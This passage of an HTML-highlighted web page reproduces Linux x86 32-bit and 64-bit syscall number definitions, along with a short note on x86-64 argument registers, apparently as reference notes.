class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getegid32 202</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setreuid32 203</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setregid32 204</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getgroups32 205</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setgroups32 206</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchown32 207</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setresuid32 208</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getresuid32 209</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setresgid32 210</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getresgid32 211</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chown32 212</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setuid32 213</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setgid32 214</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setfsuid32 215</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setfsgid32 216</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pivot_root 217</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mincore 218</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_madvise 219</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getdents64 220</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fcntl64 221</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_gettid 224</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readahead 225</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setxattr 226</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lsetxattr 227</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fsetxattr 228</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getxattr 229</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lgetxattr 230</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fgetxattr 231</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_listxattr 232</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_llistxattr 233</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_flistxattr 234</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_removexattr 235</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lremovexattr 236</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fremovexattr 237</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tkill 238</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendfile64 239</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_futex 240</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setaffinity 241</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getaffinity 242</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_thread_area 243</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_thread_area 244</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_setup 245</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_destroy 246</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_getevents 247</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_submit 248</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_cancel 249</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fadvise64 250</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_exit_group 252</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lookup_dcookie 253</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_create 254</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_ctl 255</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_wait 256</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_remap_file_pages 257</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_tid_address 258</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_create 259</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_settime 260</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_gettime 261</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_getoverrun 262</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_delete 263</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_settime 264</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_gettime 265</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_getres 266</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_nanosleep 267</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_statfs64 268</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstatfs64 269</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tgkill 270</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_utimes 271</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fadvise64_64 272</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vserver 273</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mbind 274</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_mempolicy 275</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_mempolicy 276</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_open 277</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_unlink 278</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_timedsend 279</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_timedreceive 280</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_notify 281</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_getsetattr 282</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kexec_load 283</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_waitid 284</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_add_key 286</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_request_key 287</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_keyctl 288</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioprio_set 289</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioprio_get 290</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_init 291</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_add_watch 292</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_rm_watch 293</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_migrate_pages 294</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_openat 295</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mkdirat 296</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mknodat 297</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchownat 298</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_futimesat 299</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstatat64 300</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_unlinkat 301</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_renameat 302</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_linkat 303</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_symlinkat 304</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readlinkat 305</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchmodat 306</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_faccessat 307</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pselect6 308</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ppoll 309</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_unshare 310</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_robust_list 311</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_robust_list 312</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_splice 313</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sync_file_range 314</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tee 315</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vmsplice 316</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_move_pages 317</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getcpu 318</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_pwait 319</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_utimensat 320</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_signalfd 321</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timerfd_create 322</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_eventfd 323</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fallocate 324</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timerfd_settime 325</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timerfd_gettime 326</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_signalfd4 327</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_eventfd2 328</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_create1 329</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_dup3 330</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pipe2 331</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_init1 332</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_preadv 333</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pwritev 334</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_tgsigqueueinfo 335</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_perf_event_open 336</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_recvmmsg 337</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fanotify_init 338</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fanotify_mark 339</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_prlimit64 340</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_name_to_handle_at 341</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_open_by_handle_at 342</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_adjtime 343</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_syncfs 344</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendmmsg 345</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setns 346</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_process_vm_readv 347</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_process_vm_writev 348</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kcmp 349</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_finit_module 350</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setattr 351</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getattr 352</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_renameat2 353</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_seccomp 354</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getrandom 355</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_memfd_create 356</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_bpf 357</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_execveat 358</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_socket 359</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_socketpair 360</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_bind 361</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_connect 362</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_listen 363</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_accept4 364</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getsockopt 365</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setsockopt 366</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getsockname 367</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpeername 368</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendto 369</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendmsg 370</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_recvfrom 371</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_recvmsg 372</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_shutdown 373</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_userfaultfd 374</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_membarrier 375</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mlock2 376</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_copy_file_range 377</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_preadv2 378</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pwritev2 379</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span> <span class=\"comment\">/* _ASM_X86_UNISTD_32_H */</span></span></span><br></pre></td></tr></table></figure>\n\n\n\n<h5 id=\"2）64bit\"><a href=\"#2）64bit\" class=\"headerlink\" title=\"2）64bit\"></a>2）64bit</h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">rdi, rsi, rdx, rcx, r8, r9。（<span class=\"built_in\">stack</span>）</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_read 0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_write 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_open 2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_close 3</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_stat 4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstat 5</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lstat 6</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_poll 7</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lseek 8</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mmap 9</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mprotect 10</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_munmap 11</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_brk 12</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigaction 13</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigprocmask 14</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigreturn 15</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioctl 16</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pread64 17</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pwrite64 18</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readv 19</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_writev 20</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_access 21</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pipe 22</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_select 23</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_yield 24</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mremap 25</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_msync 26</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mincore 27</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_madvise 28</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_shmget 29</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_shmat 30</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_shmctl 31</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_dup 32</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_dup2 33</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pause 34</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_nanosleep 35</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getitimer 36</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_alarm 37</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setitimer 38</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpid 39</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendfile 40</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_socket 41</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_connect 42</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_accept 43</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendto 44</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_recvfrom 45</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendmsg 46</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_recvmsg 47</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_shutdown 48</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_bind 49</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_listen 50</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getsockname 51</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpeername 52</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_socketpair 53</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setsockopt 54</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getsockopt 55</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clone 56</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fork 57</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vfork 58</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_execve 59</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_exit 60</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_wait4 61</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kill 62</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_uname 63</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_semget 64</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_semop 65</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_semctl 66</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_shmdt 67</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_msgget 68</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_msgsnd 69</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_msgrcv 70</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_msgctl 71</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fcntl 72</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_flock 73</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fsync 74</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fdatasync 75</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_truncate 76</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ftruncate 77</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getdents 78</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getcwd 79</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chdir 80</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchdir 81</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rename 82</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mkdir 83</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rmdir 84</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_creat 85</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_link 86</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_unlink 87</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_symlink 88</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readlink 89</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chmod 90</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchmod 91</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chown 92</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchown 93</span></span><br><span class=\"line\"><span class=\"meta\">#<span 